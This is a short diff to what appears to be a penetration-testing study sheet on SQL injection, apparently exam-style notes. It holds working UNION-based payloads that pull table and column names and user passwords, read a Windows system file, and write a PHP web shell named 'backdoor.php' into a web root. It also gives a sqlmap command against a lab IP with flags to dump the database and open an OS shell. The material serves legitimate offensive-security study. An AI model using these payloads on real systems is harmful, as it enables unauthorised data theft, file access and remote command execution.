@@ -753,3 +753,11 @@ Tricks:
 - Get table name: `union all select 1, 2, table_name from information_sc hema.tables`
 - Get column names: `union all select 1, 2, column_name from information_s chema.columns where table_name='users'`
 - Add other query using obtained info: `union all select 1, username, password from users`
+- Read file: `union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
+- Create PHP shell: `union all select 1, 2, "<?php echo shell_exec($_GET[' cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+
+#### SQL injection automation
+```
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+```
+Other flags: `--dump` to dump all contents of the database. `--dbms {{dbmsname}}`. `--os-shell` to try to pop a shell.
